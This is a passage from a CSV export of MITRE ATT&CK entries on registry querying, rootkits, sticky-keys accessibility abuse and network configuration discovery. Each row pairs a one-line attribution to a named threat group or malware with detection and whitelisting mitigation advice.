whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: ADVSTORESHELL, NETUI, ...",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
333,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can query for information contained within the Windows Registry.[[CiteRef::Lastline PlugX Analysis]]'],['DragonOK'],['DragonOK'],['G0017'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
334,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0075|Reg]] may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.[[CiteRef::Microsoft Reg]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: Reg, reg.exe",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
335,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0010|Turla]] surveys a system upon check-in to discover information in the Windows Registry with the <code>reg query</code> command.[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
336,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","[""[[Software/S0031|BACKSPACE]] is capable of enumerating and making modifications to an infected system's Registry.[[CiteRef::FireEye APT30]]""]",['APT30'],['APT30'],['G0013'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: BACKSPACE, Lecna",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
337,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Group/G0038|Stealth Falcon]] malware attempts to determine the installed version of .NET by querying the Registry.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]'],['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
338,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0155|WINDSHIELD]] can gather Registry values.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],Software: WINDSHIELD,['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
339,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['[[Group/G0032|Lazarus Group]] malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop.[[CiteRef::Novetta Blockbuster Loaders]]']",['Lazarus Group'],"['Lazarus Group', 'HIDDEN COBRA', 'Guardians of Peace']",['G0032'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
340,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can query for information contained within the Windows Registry.[[CiteRef::Lastline PlugX Analysis]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
341,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can query for information contained within the Windows Registry.[[CiteRef::Lastline PlugX Analysis]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
342,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']",['[[Software/S0013|PlugX]] can query for information contained within the Windows Registry.[[CiteRef::Lastline PlugX Analysis]]'],['Threat Group-3390'],"['Threat Group-3390', 'TG-3390', 'Emissary Panda', 'BRONZE UNION']",['G0027'],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],"Software: PlugX, Sogu, Kaba",['Discovery'],['Technique/T1012'],['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
343,"['Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.[[CiteRef::Wikipedia Rootkit]]']","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Process whitelisting', 'Signature-based detection', 'System access controls', 'Whitelisting by file name or path']",[],[],"['BIOS', 'MBR', 'System calls']",['[[Software/S0135|HIDEDRV]] is a rootkit that hides certain operating system artifacts.[[CiteRef::ESET Sednit Part 3]]'],['APT28'],"['APT28', 'Sednit', 'Sofacy', 'Pawn Storm', 'Fancy Bear', 'STRONTIUM', 'Tsar Team', 'Threat Group-4127', 'TG-4127']",['G0007'],"['Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: HIDEDRV,['Defense Evasion'],['Technique/T1014'],['Rootkit'],https://attack.mitre.org/wiki/Technique/T1014
344,"['Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.[[CiteRef::Wikipedia Rootkit]]']","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Process whitelisting', 'Signature-based detection', 'System access controls', 'Whitelisting by file name or path']",[],[],"['BIOS', 'MBR', 'System calls']",['[[Software/S0022|Uroburos]] is a rootkit used by [[Group/G0010|Turla]].[[CiteRef::Kaspersky Turla]]'],['Turla'],"['Turla', 'Waterbug']",['G0010'],"['Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],Software: Uroburos,['Defense Evasion'],['Technique/T1014'],['Rootkit'],https://attack.mitre.org/wiki/Technique/T1014
345,"['Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.[[CiteRef::Wikipedia Rootkit]]']","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Process whitelisting', 'Signature-based detection', 'System access controls', 'Whitelisting by file name or path']",[],[],"['BIOS', 'MBR', 'System calls']",['[[Group/G0044|Winnti Group]] used a rootkit to modify typical server functionality.[[CiteRef::Kaspersky Winnti April 2013]]'],['Winnti Group'],"['Winnti Group', 'Blackfly']",['G0044'],"['Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Defense Evasion'],['Technique/T1014'],['Rootkit'],https://attack.mitre.org/wiki/Technique/T1014
346,"['Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.']",[],['558'],"['Paul Speulstra, AECOM Global Security Operations Center']","['Windows Registry', 'File monitoring', 'Process monitoring']",['[[Group/G0009|Deep Panda]] has used the sticky-keys technique to bypass the RDP login screen on remote systems during intrusions.[[CiteRef::RSA Shell Crew]]'],['Deep Panda'],"['Deep Panda', 'Shell Crew', 'WebMasters', 'KungFu Kittens', 'PinkPanther', 'Black Vine']",['G0009'],"['To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.[[CiteRef::TechNet RDP NLA]]\n\nIf possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.[[CiteRef::TechNet RDP Gateway]]\n\nIdentify and block potentially malicious software that may be executed by an adversary with this technique by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",['Technique/T1015'],['Accessibility Features'],https://attack.mitre.org/wiki/Technique/T1015
347,"['Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.']",[],['558'],"['Paul Speulstra, AECOM Global Security Operations Center']","['Windows Registry', 'File monitoring', 'Process monitoring']",['[[Group/G0001|Axiom]] actors have been known to use the Sticky Keys replacement within RDP sessions to obtain persistence.[[CiteRef::Axiom]]'],['Axiom'],"['Axiom', 'Group 72']",['G0001'],"['To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.[[CiteRef::TechNet RDP NLA]]\n\nIf possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.[[CiteRef::TechNet RDP Gateway]]\n\nIdentify and block potentially malicious software that may be executed by an adversary with this technique by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",['Technique/T1015'],['Accessibility Features'],https://attack.mitre.org/wiki/Technique/T1015
348,"['Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.']",[],['558'],"['Paul Speulstra, AECOM Global Security Operations Center']","['Windows Registry', 'File monitoring', 'Process monitoring']","['[[Group/G0016|APT29]] used sticky-keys to obtain unauthenticated, privileged console access.[[CiteRef::Mandiant No Easy Breach]][[CiteRef::FireEye APT29 Domain Fronting]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.[[CiteRef::TechNet RDP NLA]]\n\nIf possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.[[CiteRef::TechNet RDP Gateway]]\n\nIdentify and block potentially malicious software that may be executed by an adversary with this technique by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",['Technique/T1015'],['Accessibility Features'],https://attack.mitre.org/wiki/Technique/T1015
349,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0124|Pisloader]] has a command to collect the victim's IP address.[[CiteRef::Palo Alto DNS Requests]]""]",['APT18'],"['APT18', 'Threat Group-0416', 'TG-0416', 'Dynamite Panda']",['G0026'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],Software: Pisloader,['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
350,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['[[Software/S0125|Remsec]] can obtain information about network configuration, including the routing table, ARP cache, and DNS cache.[[CiteRef::Kaspersky ProjectSauron Technical Analysis]]']",['Strider'],"['Strider', 'ProjectSauron']",['G0041'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],"Software: Remsec, Backdoor.Remsec, ProjectSauron",['Discovery'],['Technique/T1016'],['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
351,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","[""[[Software/S0130|Unknown Logger]] can obtain information about the victim's IP address.[[CiteRef::Forcepoint Monsoon]]""]",['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands 